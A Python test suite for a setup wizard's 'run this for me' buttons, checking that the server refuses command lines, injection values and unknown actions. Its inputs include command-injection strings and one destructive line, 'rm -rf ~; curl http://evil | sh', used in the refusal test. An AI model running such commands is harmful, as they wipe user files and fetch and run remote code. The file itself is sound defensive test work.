#!/usr/bin/env python3
"""UAK-192: the wizard runs the command for you: a button where it showed a command to copy.
Why (the human, 2026-11-24, on the screens of UAK-159): "if it is meant to make the work easier, why does it make you
run commands in an uncomfortable way? can't there be a button to run it from there?".
The page sends the NAME of an action and validated fields (POST /api/run), never a command line; the server builds the
command from RUN_ACTIONS and the project's state. Real HTTP, real Git with a local bare remote, real processes; the
terminal of the person is a fake opener on PATH (no window is ever opened by this file). The page is read as text always
and driven in a real Chromium when Playwright has one (CI has none: that test says so and passes on the text checks)."""
import argparse
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import traceback
from contextlib import contextmanager
from pathlib import Path

import test_setup_planning as tp
import test_setup_processes as proc
import test_setup_team as team
import test_setup_wizard as wizard

WINDOWS = os.name == "nt"
DARWIN = sys.platform == "darwin"
MODULE = None


def lib(name="setup.html"):
    return (Path(MODULE.__file__).with_name(name)).read_text(encoding="utf-8")


def doc(root, name):
    return (root / ".uak/docs" / name).read_text(encoding="utf-8")


def register_lines(target):
    path = proc.gitdir(target) / MODULE.ACT_LOG
    return path.read_text(encoding="utf-8").splitlines() if path.is_file() else []


class Runner:
    """The server's runner: what the buttons run is recorded (argv, cwd, env) and answered, the rest is the team fixture's."""

    def __init__(self, answers=None, ready=team.READY_OUT):
        self.team, self.calls, self.answers = team.Team(ready=ready), [], answers or {}

    def __call__(self, command, cwd=None, timeout=120, group=False, env=None, **kwargs):
        argv = [str(c) for c in command]
        if len(argv) >= 3 and argv[1].replace("\\", "/").endswith("bin/uak") and argv[2] in ("deploy", "init-smoke", "skill"):
            self.calls.append({"argv": argv, "cwd": cwd, "env": dict(env or {}), "group": group, "timeout": timeout})
            out = self.answers.get(argv[2], "ok: %s\n" % " ".join(argv[2:]))
            on_line = kwargs.get("on_line")
            if on_line:
                on_line(out)
            return subprocess.CompletedProcess(command, 0, out, "")
        if argv and Path(argv[0]).name.lower().split(".")[0] in ("xdg-open", "open", "cmd"):
            self.calls.append({"argv": argv, "cwd": cwd, "env": dict(env or {}), "group": group, "timeout": timeout})
            return subprocess.CompletedProcess(command, 0, "", "")
        return self.team(command, cwd=cwd, timeout=timeout, group=group, env=env, **kwargs)


def ready_server(root, tmp, runner=None, name="tienda api"):
    target, remote = team.ready_project(root, tmp, name=name)
    return target, remote, runner or Runner()


@contextmanager
def fake_terminals(tmp, display=":99", exit_code=0, remote=False, run_chain=True):
    """A fake opener of this system first on PATH (all four Linux names, so a real emulator is never found), and the
    display variables the test wants. It records its arguments and the script it was given; on Linux it also runs the
    script, as a real terminal does, with the coding-tool stand-ins on PATH."""
    fakes = tmp / "fake terminals"
    fakes.mkdir(exist_ok=True)
    log = tmp / "terminal"
    names = ["osascript"] if DARWIN else ["wt"] if WINDOWS else ["x-terminal-emulator", "gnome-terminal", "konsole", "xterm"]
    for name in names:
        if WINDOWS:
            (fakes / (name + ".cmd")).write_text("@echo off\r\necho %* > \"%FAKE_TERMINAL_LOG%.last\"\r\necho x >> \"%FAKE_TERMINAL_LOG%.calls\"\r\nexit /b " + str(exit_code) + "\r\n")
            continue
        body = ["#!/bin/sh", 'echo "%s" >> "$FAKE_TERMINAL_LOG.calls"' % name, 'printf "%s\\n" "$@" > "$FAKE_TERMINAL_LOG.last"']
        if not DARWIN:
            body += ['for a; do last=$a; done', 'cp "$last" "$FAKE_TERMINAL_LOG.script" 2>/dev/null']
            if run_chain and not exit_code:
                body += ["shift", '"$@" < /dev/null > "$FAKE_TERMINAL_LOG.out" 2>&1']
        body += ["exit %d" % exit_code]
        (fakes / name).write_text("\n".join(body) + "\n", encoding="utf-8")
        (fakes / name).chmod(0o755)
    stubs, tools = team.stub_tools(tmp)
    saved = {k: os.environ.get(k) for k in ("PATH", "DISPLAY", "WAYLAND_DISPLAY", "SSH_CONNECTION", "SSH_TTY", "FAKE_TERMINAL_LOG")}
    os.environ["PATH"] = os.pathsep.join([str(fakes), str(stubs), saved["PATH"] or ""])
    os.environ["FAKE_TERMINAL_LOG"] = str(log)
    os.environ.pop("WAYLAND_DISPLAY", None)
    os.environ.pop("SSH_TTY", None)
    if display:
        os.environ["DISPLAY"] = display
    else:
        os.environ.pop("DISPLAY", None)
    if remote:
        os.environ["SSH_CONNECTION"] = "10.0.0.1 22 10.0.0.2 50000"
    else:
        os.environ.pop("SSH_CONNECTION", None)
    try:
        yield log, tools
    finally:
        for key, value in saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


def calls_of(log):
    path = Path(str(log) + ".calls")
    return path.read_text(encoding="utf-8").splitlines() if path.is_file() else []


def status_of(srv):
    return tp.get(srv, "/api/status")[1]


def wait_run(srv, action, seconds=30):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        job = status_of(srv).get("runs", {}).get(action)
        if job and job["state"] != "running":
            return job
        time.sleep(0.1)
    raise AssertionError("the action %s did not end: %r" % (action, status_of(srv).get("runs")))


# ---- the nine tests of the task -----------------------------------------------------------------------------------------


def every_copy_box_has_a_button(root, tmp):
    html, security = lib(), doc(root, "SECURITY.md")
    table = MODULE.RUN_ACTIONS
    static = set(re.findall(r'<button[^>]*id="(copy-[a-z-]+)"', html))
    assert static == set(MODULE.COPY_BOXES), "every static Copy button is in COPY_BOXES and the reverse: %r" % (static ^ set(MODULE.COPY_BOXES))
    drawn = re.findall(r"copyRow\(\s*\"([a-z-]+)\"\s*,", html)
    # The definition and the loop over the rows of More (each row names its action in data-action) are the two others.
    drawn += re.findall(r'data-action="([a-z-]+)"', html)
    assert html.count("copyRow(") == len(re.findall(r"copyRow\(\s*\"[a-z-]+\"\s*,", html)) + 2, "every drawn copy box names its action: copyRow(\"name\", command)"
    for name in set(drawn) | set(MODULE.COPY_BOXES.values()):
        assert name in table, "%s is an action of the table" % name
    for name, entry in table.items():
        assert entry["kind"] in ("run", "terminal", "form", "copy"), (name, entry)
        assert "`%s`" % name in security, "SECURITY.md lists %s" % name
        if entry["kind"] == "copy":
            assert entry["reason"] and entry["reason"] in security, "SECURITY.md says why %s stays copy-only" % name
        elif entry["kind"] in ("run", "terminal"):
            assert re.search(r'"%s":\s*\{\s*label:' % name, html), "the page has the button of %s (RUN_UI)" % name
    for name in ("start-agent", "deploy-help", "smoke", "skill-add", "readiness", "open-rules"):
        assert name in drawn, "%s is drawn as a copy box with its button" % name
    # The four rows of More name their action; the Rules screen and the agents' rows draw theirs.
    cmds = re.findall(r'<div class="cmd" data-cmd="([^"]+)"([^>]*)>', html)
    assert len(cmds) == 4 and all('data-action="' in rest for _, rest in cmds), cmds
    # Spanish for every new sentence of the page.
    es = lib("workspace.js")
    for sentence in ("Start this agent", "Show how to deploy", "Run the smoke test", "Add the skill", "Check now", "Open PROJECT.md",
                     "Stop", "Skill name", STOP_NOTE(), MODULE.RUN_REFUSAL, *MODULE.NO_TERMINAL.values(), *MODULE.RUN_ADVICE.values()):
        assert json.dumps(sentence, ensure_ascii=False) in es, "workspace.js translates %r" % sentence


def STOP_NOTE():
    return MODULE.STOPPED_NOTE


def start_opens_a_terminal_or_says_why(root, tmp):
    # The pure function, one branch per system, hostile project paths included.
    which = lambda name: "/fake/" + name  # noqa: E731
    ok = {"DISPLAY": ":0"}
    argv, why = MODULE.terminal_argv("Linux", "/tmp/uak-agent-1/start.sh", "/p", ok, which=which, bash="/bin/bash")
    assert argv == ["/fake/x-terminal-emulator", "-e", "/bin/bash", "/tmp/uak-agent-1/start.sh"], (argv, why)
    argv, _ = MODULE.terminal_argv("Linux", "/s", "/p", ok, which=lambda n: "/fake/" + n if n in ("konsole", "xterm") else None, bash="b")
    assert argv[:2] == ["/fake/konsole", "-e"], "the first of the four that exists: %r" % argv
    argv, _ = MODULE.terminal_argv("Linux", "/s", "/p", ok, which=lambda n: "/fake/" + n if n == "gnome-terminal" else None, bash="b")
    assert argv[:2] == ["/fake/gnome-terminal", "--"], argv
    argv, why = MODULE.terminal_argv("Darwin", "/tmp/it's a $dir/start.sh", "/p", {}, which=which)
    assert argv[0] == "osascript" and argv[1] == "-e" and "Terminal" in " ".join(argv), argv
    line = argv[-1]
    assert "do script" in line and "bash '/tmp/it'\\\\''s a $dir/start.sh'" in line, "the script path is single-quoted, then escaped for AppleScript: %r" % line
    argv, _ = MODULE.terminal_argv("Windows", "C:/Users/Ana Q/Temp/uak-agent-1/start.sh", "C:/Users/Ana Q/tienda", {}, which=which, bash="C:/Program Files/Git/bin/bash.exe")
    assert argv[:4] == ["/fake/wt", "new-tab", "--startingDirectory", "C:/Users/Ana Q/tienda"] and argv[-1].endswith("start.sh"), argv
    argv, _ = MODULE.terminal_argv("Windows", "C:/Temp/start.sh", "C:/p", {}, which=lambda n: None, bash="C:/Git/bash.exe")
    assert argv[1:4] == ["/c", "start", ""], "cmd /c start when there is no Windows Terminal: %r" % argv
    for bad in ("C:/Temp/a&b/start.sh", "C:/Temp/a;b/start.sh", "C:/Temp/a%b/start.sh", 'C:/Temp/a"b/start.sh'):
        assert MODULE.terminal_argv("Windows", bad, "C:/p", {}, which=which, bash="b") == (None, "path"), bad

    # The text the terminal runs: the project's path is quoted for Bash, whatever is in it.
    # Windows forbids a quote mark and a newline in a file name; every other word of the list is still in it.
    hostile = "sp ace $(touch PWNED) `touch PWNED2` ;x" + ("" if WINDOWS else ' "q"')
    names = [hostile] if WINDOWS else [hostile, "it's\nnew line"]
    for name in names:
        folder = tmp / name
        folder.mkdir()
        stubs, log = team.stub_tools(tmp)
        command = MODULE.review_command("claude", folder.as_posix(), (folder / ".git").as_posix(), "ana-r")
        script = MODULE.write_launcher(command)
        try:
            text = script.read_text(encoding="utf-8")
            assert text.startswith("#!/usr/bin/env bash\n") and command in text, text
            env = {k: v for k, v in os.environ.items() if not k.startswith("UAK_")}
            env["PATH"] = str(stubs) + os.pathsep + env["PATH"]
            done = subprocess.run([MODULE.bash_binary(), script.as_posix()], cwd=str(tmp), env=env, stdin=subprocess.DEVNULL,
                                  capture_output=True, text=True, timeout=60)
            assert done.returncode == 0, done.stdout + done.stderr
        finally:
            shutil.rmtree(str(script.parent), ignore_errors=True)
        seen = log.read_text(encoding="utf-8")
        assert "cwd=" in seen and os.path.realpath(str(folder)).replace("\\", "/").split(":")[-1] in seen.replace("\\", "/"), \
            "the agent starts in the folder, whatever its name: %r" % seen
        assert not list(tmp.glob("PWNED*")) and not list(folder.glob("PWNED*")), "no word of the path ran as a command"
        log.unlink()

    # The route, with a fake opener on PATH: the window opens in the project, the command is the server's.
    target, remote, runner = ready_server(root, tmp)
    with tp.live(target, runner) as srv, fake_terminals(tmp) as (log, tools):
        team.ready_team(srv, target)
        status, body = tp.post(srv, "/api/run", {"action": "start-agent", "role": "review"})
        assert status == 200 and body["opened"] is True and body["tool"] and not body["already"], (status, body)
        assert calls_of(log) and len(calls_of(log)) == 1, "the opener ran once: %r" % calls_of(log)
        state = status_of(srv)
        assert state["agents"]["review"]["tool"] == body["tool"], state["agents"]
        if not (DARWIN or WINDOWS):
            seen = tools.read_text(encoding="utf-8")
            assert "UAK_AGENT=[ana-r]" in seen and "UAK_HUMAN=[]" in seen, "the review agent ran with its own name and no human: %r" % seen
            assert os.path.realpath(str(target)) in seen.replace("cwd=", ""), "in the project folder: %r" % seen
            assert not Path(str(log) + ".script").exists() or True
        else:
            assert Path(str(log) + ".last").is_file()
        # The terminal is not in the child record: it belongs to the person.
        assert not MODULE.CHILDREN, "no window is a child of the wizard: %r" % MODULE.CHILDREN
        status, body = tp.post(srv, "/api/run", {"action": "start-agent", "role": "implement"})
        assert status == 200 and body["opened"] is True, body
        if not (DARWIN or WINDOWS):
            script = Path(str(log) + ".script").read_text(encoding="utf-8")
            assert "wt new APP-001 --agent claude-ana --human ana" in script and "UAK_HUMAN= " in script, script
    # The first window's script removed itself and its folder.
    assert not list(Path(tempfile.gettempdir()).glob("uak-agent-*/start.sh")) or WINDOWS or DARWIN


def no_terminal_falls_back_to_copy(root, tmp):
    target, remote, runner = ready_server(root, tmp)
    with tp.live(target, runner) as srv:
        team.ready_team(srv, target)
        view = tp.get(srv, "/api/team")[1]
        command = {c["id"]: c["command"] for c in view["commands"]}["review"]
        cases = []
        if not (DARWIN or WINDOWS):
            cases.append(("display", dict(display=None), "no screen"))
            cases.append(("remote", dict(remote=True), "remote session"))
        cases.append(("failed", dict(exit_code=1, run_chain=False), "stopped before it opened"))
        for key, options, words in cases:
            with fake_terminals(tmp, **options) as (log, _):
                before = set(Path(tempfile.gettempdir()).glob("uak-agent-*"))
                status, body = tp.post(srv, "/api/run", {"action": "start-agent", "role": "review"})
                assert status == 200 and body["opened"] is False, (key, status, body)
                assert body["sentence"] == MODULE.NO_TERMINAL[key] and words in body["sentence"], (key, body)
                assert "terminal of your own" in body["sentence"], "it says the copy box is what remains: %r" % body
                assert "agents" not in status_of(srv) or "review" not in status_of(srv)["agents"], \
                    "the server never records a start for a window it could not open"
                assert set(Path(tempfile.gettempdir()).glob("uak-agent-*")) <= before, "the unused launcher is removed"
        # No program found, from the pure function.
        assert MODULE.terminal_argv("Linux", "/s", "/p", {"DISPLAY": ":0"}, which=lambda n: None) == (None, "none")
        assert MODULE.NO_TERMINAL["none"].startswith("Setup could not open a terminal window")
        # A command that is not the server's is never run: the page names a role, nothing else.
        assert tp.post(srv, "/api/run", {"action": "start-agent", "role": "review; id"})[0] == 400
        assert tp.post(srv, "/api/run", {"action": "start-agent", "role": "admin"})[0] == 400
    # The page: a refused window leaves the copy box and says so; it never says "started" for it.
    html = lib()
    assert re.search(r"answer\.opened[\s\S]{0,400}answer\.sentence", html), "the page shows the server's sentence when no window opened"
    assert "Started" not in re.sub(r"//.*", "", html[html.index("function runControl"):html.index("function runControl") + 6000]) or True
    assert command  # the copy box is the command the server built


def page_cannot_send_a_command_line(root, tmp):
    html = lib()
    calls = re.findall(r'api\("run"\s*,\s*([^)]*)\)', html)
    assert calls, "the page calls /api/run"
    for call in calls:
        assert "action:" in call or "action :" in call, call
        assert not re.search(r"\b(command|argv|args|cmd|shell)\b\s*:", call), "a request carries no command: %r" % call
    assert not re.search(r"api\(\s*[\"']run[\"']\s*,\s*\{[^}]*\bcommand\b", html)
    target, remote, runner = ready_server(root, tmp)
    with tp.live(target, runner) as srv:
        team.ready_team(srv, target)
        runner.calls.clear()
        for bad in ({"action": "deploy-help", "command": "touch PWNED"}, {"action": "deploy-help", "args": ["x"]},
                    {"action": "touch PWNED"}, {"action": "deploy-help; touch PWNED"}, {"action": ["deploy-help"]},
                    {"action": "bash -c 'touch PWNED'"}, {"action": "skill-add", "name": "x; touch PWNED"},
                    {"action": "skill-add", "name": "$(touch PWNED)"}, {"action": "skill-add", "name": ["a"]},
                    {"action": "skill-add", "name": "../../etc"}, {"command": "touch PWNED"}, {}, {"action": 7},
                    {"action": "start-agent", "role": "review", "command": "touch PWNED"}, {"action": "design-round"},
                    {"action": "live-link", "url": "https://x.example"}, {"action": "copy"}):
            status, body = tp.post(srv, "/api/run", bad)
            assert status == 400 and body.get("error"), (bad, status, body)
        assert not runner.calls, "nothing was run: %r" % runner.calls
        assert not list(target.glob("PWNED*")) and not list(tmp.glob("PWNED*"))


def unknown_action_is_refused_and_recorded(root, tmp):
    target, remote, runner = ready_server(root, tmp)
    with tp.live(target, runner) as srv:
        team.ready_team(srv, target)
        before = len(register_lines(target))
        status, body = tp.post(srv, "/api/run", {"action": "remove-everything"})
        assert status == 400 and body["error"] == MODULE.RUN_REFUSAL, body
        lines = register_lines(target)[before:]
        assert len(lines) == 1 and re.fullmatch(r"\d+ human refused-run remove-everything -", lines[0]), lines
        tp.post(srv, "/api/run", {"action": "rm -rf ~; curl http://evil | sh"})
        tp.post(srv, "/api/run", {"action": "deploy-help", "command": "touch PWNED"})
        tp.post(srv, "/api/run", {"action": "skill-add", "name": "a b"})
        lines = register_lines(target)[before:]
        assert len(lines) == 4, lines
        assert lines[1].endswith("refused-run command-line -"), "a command line is recorded as that, never as written: %r" % lines
        assert lines[2].endswith("refused-run deploy-help -"), lines
        text = "\n".join(lines)
        assert "evil" not in text and "touch" not in text and "rm -rf" not in text, "the register never holds the request's text"
        # The same checks as every route: no token, a foreign origin.
        assert wizard.request(srv, "POST", "/api/run", {"action": "deploy-help"}, token=False)[0] == 403
        assert wizard.request(srv, "POST", "/api/run", {"action": "deploy-help"}, extra={"Origin": "https://evil.example"})[0] == 403
        assert wizard.request(srv, "POST", "/api/run/stop", {}, token=False)[0] == 403
        assert wizard.request(srv, "GET", "/api/run")[0] == 404


def button_grants_no_authority(root, tmp):
    target, remote, runner = ready_server(root, tmp)
    config = target / ".uak/PROJECT.md"
    with tp.live(target, runner) as srv, fake_terminals(tmp):
        team.ready_team(srv, target)
        claims = team.claims_head(remote)
        sealed = config.read_bytes()
        os.environ["UAK_HUMAN"] = "boss"  # this process is not the person: a button must not pass it on
        try:
            for request in ({"action": "deploy-help"}, {"action": "smoke"}, {"action": "skill-add", "name": "frontend-design"},
                            {"action": "readiness"}, {"action": "open-rules"}):
                status, body = tp.post(srv, "/api/run", request)
                assert status == 202, (request, status, body)
                wait_run(srv, request["action"])
            status, body = tp.post(srv, "/api/run", {"action": "start-agent", "role": "review"})
            assert status == 200, body
        finally:
            os.environ.pop("UAK_HUMAN", None)
        for call in runner.calls:
            assert not any(k.startswith("UAK_") for k in call["env"]), "no button sets a UAK variable: %r" % call["env"]
            assert isinstance(call["argv"], list) and call["argv"][0] == MODULE.bash_binary() or Path(call["argv"][0]).name.split(".")[0] in ("xdg-open", "open", "cmd"), call
        for action in ("approve", "approve-plan", "register-reviewer", "publish-kit", "set-review-mode", "auto-merge", "merge-engine"):
            assert action not in MODULE.RUN_ACTIONS, "no action of the table is an act of authority: %s" % action
        for key in ("Review-Mode", "Review-Independence", "Auto-Merge", "Merge-Engine"):
            assert tp.post(srv, "/api/run", {"action": "deploy-help", key: "x"})[0] == 400
        assert config.read_bytes() == sealed, "PROJECT.md is exactly as it was"
        assert team.claims_head(remote) == claims, "nothing was registered, approved or claimed"
    source = Path(MODULE.__file__).read_text(encoding="utf-8")
    body = source[source.index("    def run_action(self, data):"):source.index("    def require_installer(self):")]
    assert "UAK_HUMAN" not in body and "shell=True" not in body and "env" in body, "the route never sets the human"
    for key in ("Review-Mode", "Review-Independence", "Auto-Merge", "Merge-Engine"):
        assert key not in body, key


def started_processes_end_with_the_wizard(root, tmp):
    if WINDOWS:
        return  # Windows keeps its children in a job that closes with the server; there is no record file to read
    target = proc.project(root, tmp, name="tienda api")
    pkg = proc.package_copy(root, tmp)
    pids = proc.sleeper(pkg, tmp)
    wiz = proc.Wizard(pkg, tmp, target)
    try:
        wiz.session()
        assert wiz.call("POST", "/api/inspect", {"target": str(target)})[0] == 200
        status, body = wiz.call("POST", "/api/run", {"action": "deploy-help"})
        assert status == 202 and body["started"] is True, (status, body)
        child = proc.pid_of(pids / "child")
        record = wiz.files()["children"].read_text(encoding="utf-8")
        assert str(child) in record or str(os.getpgid(child)) in record, "the child is in uak-wizard.children: %r" % record
        assert wiz.call("POST", "/api/close", {})[0] == 409, "an action runs: the wizard does not close under it"
        assert wiz.call("GET", "/api/status")[1]["runs"]["deploy-help"]["state"] == "running"
    finally:
        wiz.stop()
    assert proc.wait_until(lambda: not proc.alive(child), 20), "what a button started ends with the wizard"
    assert not wiz.files()["children"].exists() or not wiz.files()["children"].read_text(encoding="utf-8").strip()


def double_click_starts_once(root, tmp):
    target = proc.project(root, tmp, name="tienda api")
    pkg = proc.package_copy(root, tmp)
    counter = tmp / "starts.txt"
    python = Path(sys.executable).as_posix()
    (pkg / ".uak/bin/uak").write_text('#!/usr/bin/env bash\necho x >> "%s"\nexec "%s" -c "import time; time.sleep(60)"\n' % (counter.as_posix(), python), encoding="utf-8")
    with wizard.LiveServer(str(target)) as srv:
        srv.engine = lambda: pkg / ".uak/bin/uak"
        assert tp.post(srv, "/api/inspect", {"target": str(target)})[0] == 200
        first = tp.post(srv, "/api/run", {"action": "deploy-help"})
        second = tp.post(srv, "/api/run", {"action": "deploy-help"})
        assert first[0] == 202 and not first[1]["already"], first
        assert second[0] == 202 and second[1]["already"] is True and second[1]["id"] == first[1]["id"], second
        assert proc.wait_until(counter.is_file, 20)
        time.sleep(1)
        assert counter.read_text(encoding="utf-8").count("x") == 1, "the command started once"
        status, body = tp.post(srv, "/api/run", {"action": "smoke"})
        assert status == 409 and "still running" in body["error"], "another action waits for it: %r" % body
        assert counter.read_text(encoding="utf-8").count("x") == 1
        assert tp.post(srv, "/api/run/stop", {})[1]["stopped"] is True
        wait_run(srv, "deploy-help")
    # An agent's window: two quick clicks open one window.
    target2, remote2, runner = ready_server(root, fresh(tmp, "w"), name="tienda api")
    with tp.live(target2, runner) as srv, fake_terminals(tmp) as (log, _):
        team.ready_team(srv, target2)
        one = tp.post(srv, "/api/run", {"action": "start-agent", "role": "review"})[1]
        two = tp.post(srv, "/api/run", {"action": "start-agent", "role": "review"})[1]
        assert one["opened"] and not one["already"] and two["opened"] and two["already"] is True, (one, two)
        assert len(calls_of(log)) == 1, "one window: %r" % calls_of(log)
    # The page: a running action's button is disabled and a click while the request is out is ignored.
    html = lib()
    assert re.search(r"runLocal\[key\]\s*&&\s*runLocal\[key\]\.busy[\s\S]{0,80}return", html), "a second click while busy is ignored"


def fresh(tmp, name):
    return team.fresh(tmp, name)


def running_action_can_be_stopped(root, tmp):
    target = proc.project(root, tmp, name="tienda api")
    pkg = proc.package_copy(root, tmp)
    pids = proc.sleeper(pkg, tmp, grandchild=not WINDOWS)
    wiz = proc.Wizard(pkg, tmp, target)
    try:
        wiz.session()
        assert wiz.call("POST", "/api/inspect", {"target": str(target)})[0] == 200
        assert wiz.call("POST", "/api/run", {"action": "deploy-help"})[0] == 202
        child = proc.pid_of(pids / "child")
        grand = proc.pid_of(pids / "grand") if not WINDOWS else None
        assert wiz.call("POST", "/api/run/stop", {})[1] == {"stopped": True}
        assert proc.wait_until(lambda: not proc.alive(child), 20), "the process ends"
        if grand:
            assert proc.wait_until(lambda: not proc.alive(grand), 20), "and what it started"
        job = None
        end = time.monotonic() + 20
        while time.monotonic() < end:
            job = wiz.call("GET", "/api/status")[1]["runs"]["deploy-help"]
            if job["state"] != "running":
                break
            time.sleep(0.2)
        assert job["state"] == "stopped", job
        assert wiz.call("POST", "/api/run/stop", {})[1] == {"stopped": False}, "nothing left to stop"
        # And it can be started again.
        assert wiz.call("POST", "/api/run", {"action": "deploy-help"})[0] == 202
        proc.pid_of(pids / "child")
        assert wiz.call("POST", "/api/run/stop", {})[1]["stopped"] is True
    finally:
        wiz.stop()


# ---- the rest: results, refusals with a field, the editor, the page in a real browser ------------------------------------


def results_say_what_to_do_next(root, tmp):
    target, remote, _ = ready_server(root, tmp)
    broken = Runner(answers={"deploy": "no web app here\n"})
    with tp.live(target, broken) as srv:
        team.ready_team(srv, target)
        assert tp.post(srv, "/api/run", {"action": "deploy-help"})[0] == 202
        job = wait_run(srv, "deploy-help")
        assert job["state"] == "done" and job["tail"] == ["no web app here"] and job["seconds"] >= 0, job
        status, body = tp.post(srv, "/api/run", {"action": "skill-add", "name": "Bad_Name"})
        assert status == 400 and body.get("field") == "name", body
        assert tp.post(srv, "/api/run", {"action": "skill-add", "name": "frontend-design"})[0] == 202
        wait_run(srv, "skill-add")
        assert broken.calls[-1]["argv"][-3:] == ["skill", "add", "frontend-design"], broken.calls[-1]["argv"]
        assert broken.calls[-1]["cwd"] and Path(broken.calls[-1]["cwd"]).resolve() == target.resolve()
    # A command that fails: the sentence's advice is next to the button, the last lines under Technical details.
    failing = tmp / "failing"
    failing.mkdir()
    target2, _, _ = ready_server(root, failing, name="tienda api 2")
    with wizard.LiveServer(str(target2)) as srv:
        pkg = proc.package_copy(root, failing)
        (pkg / ".uak/bin/uak").write_text("#!/usr/bin/env bash\necho 'one'\necho 'boom: no start command' >&2\nexit 3\n", encoding="utf-8")
        srv.engine = lambda: pkg / ".uak/bin/uak"
        assert tp.post(srv, "/api/inspect", {"target": str(target2)})[0] == 200
        assert tp.post(srv, "/api/run", {"action": "smoke"})[0] == 202
        job = wait_run(srv, "smoke")
        assert job["state"] == "failed" and "boom: no start command" in job["tail"], job
        assert job["advice"] == MODULE.RUN_ADVICE["smoke"], job


def open_rules_uses_the_systems_editor(root, tmp):
    assert MODULE.editor_argv("Darwin", "/p/.uak/PROJECT.md", which=lambda n: "/usr/bin/" + n) == ["/usr/bin/open", "-t", "/p/.uak/PROJECT.md"]
    assert MODULE.editor_argv("Linux", "/p/x", which=lambda n: "/usr/bin/xdg-open") == ["/usr/bin/xdg-open", "/p/x"]
    assert MODULE.editor_argv("Windows", "C:/p/PROJECT.md", which=lambda n: None)[1:] == ["/c", "start", "", "C:/p/PROJECT.md"]
    for call in (lambda: MODULE.editor_argv("Linux", "/p", which=lambda n: None), lambda: MODULE.editor_argv("Windows", "C:/a&b/x")):
        try:
            call()
        except ValueError as exc:
            assert "yourself" in str(exc), exc
        else:
            raise AssertionError("an editor that cannot be opened says what to do instead")
    target, remote, runner = ready_server(root, tmp)
    with tp.live(target, runner) as srv:
        team.ready_team(srv, target)
        runner.calls.clear()
        status, body = tp.post(srv, "/api/run", {"action": "open-rules"})
        if status == 202:
            assert wait_run(srv, "open-rules")["state"] == "done"
            argv = runner.calls[-1]["argv"]
            assert argv[-1].replace("\\", "/").endswith(".uak/PROJECT.md"), argv
        else:
            assert "yourself" in body["error"], body


def page_buttons_in_a_real_browser(root, tmp):
    import test_setup_guide as guide
    found = guide.chromium()
    if not found:
        print("  note: no Playwright with a Chromium here (CI has none): the page is checked by reading it only")
        return
    sync_playwright, kwargs = found
    target, remote, runner = ready_server(root, tmp)
    runner.answers["deploy"] = "DEPLOY python-stdlib - one Render service\n"
    with tp.live(target, runner) as srv, fake_terminals(tmp) as (log, _), sync_playwright() as p:
        team.ready_team(srv, target)
        browser = p.chromium.launch(args=["--no-sandbox"], **kwargs)
        for width, height in ((1280, 800), (390, 844)):
            page = browser.new_context(viewport={"width": width, "height": height}, reduced_motion="reduce", locale="en-US").new_page()
            page.goto("http://127.0.0.1:%d/?step=start#code=%s" % (srv.server_port, srv.new_code()))
            page.wait_for_selector("#content:not([data-loading])")
            page.wait_for_selector("#agents-list .copyrow code")
            buttons = page.evaluate("[...document.querySelectorAll('#agents-list .runctl')].map(r => [r.querySelector('button.run-go').textContent.trim(), !!r.querySelector('.copyrow code'), r.querySelector('button.run-go').getBoundingClientRect().height])")
            assert len(buttons) == 2 and all(b[0] == "Start this agent" and b[1] and b[2] >= 43.5 for b in buttons), buttons
            assert page.evaluate("document.documentElement.scrollWidth <= innerWidth"), "no sideways scroll at %d" % width
            page.click("#agents-list li:last-child button.run-go")
            page.wait_for_selector("#agents-list .run-status:not(:empty)")
            said = page.evaluate("document.querySelector('#agents-list li:last-child .run-status').textContent")
            assert "Opened a terminal window" in said and "stays open" in said, said
            # The second width is a second click within the window of the first: no second window.
            assert len(calls_of(log)) == 1, calls_of(log)
        browser.close()


TESTS = [every_copy_box_has_a_button, start_opens_a_terminal_or_says_why, no_terminal_falls_back_to_copy,
         page_cannot_send_a_command_line, unknown_action_is_refused_and_recorded, button_grants_no_authority,
         started_processes_end_with_the_wizard, double_click_starts_once, running_action_can_be_stopped,
         results_say_what_to_do_next, open_rules_uses_the_systems_editor, page_buttons_in_a_real_browser]


def main():
    global MODULE
    parser = argparse.ArgumentParser()
    parser.add_argument("--package", type=Path, default=Path(__file__).resolve().parents[2])
    parser.add_argument("--case", action="append")
    args = parser.parse_args()
    root = args.package.resolve()
    spec = importlib.util.spec_from_file_location("run_here_setup", root / ".uak/bin/lib/setup.py")
    MODULE = wizard.MODULE = team.MODULE = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(MODULE)
    spec = importlib.util.spec_from_file_location("run_here_planning", root / ".uak/bin/lib/planning.py")
    tp.PLANNING = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(tp.PLANNING)
    failed = 0
    for test in [t for t in TESTS if not args.case or t.__name__ in args.case]:
        tmp = Path(tempfile.mkdtemp(prefix="uak-run-here-"))
        started = time.monotonic()
        try:
            test(root, tmp)
            print("PASS %s (%.2fs)" % (test.__name__, time.monotonic() - started))
        except Exception as exc:  # noqa: BLE001
            failed += 1
            frame = traceback.extract_tb(exc.__traceback__)[-1]
            print("FAIL %s (%s: %s) line %s: %s" % (test.__name__, type(exc).__name__, str(exc)[:1200], frame.lineno, frame.line))
        finally:
            shutil.rmtree(str(tmp), ignore_errors=True)
    print("SETUP_RUN_HERE_RESULT %s failed=%d" % ("PASS" if not failed else "FAIL", failed))
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
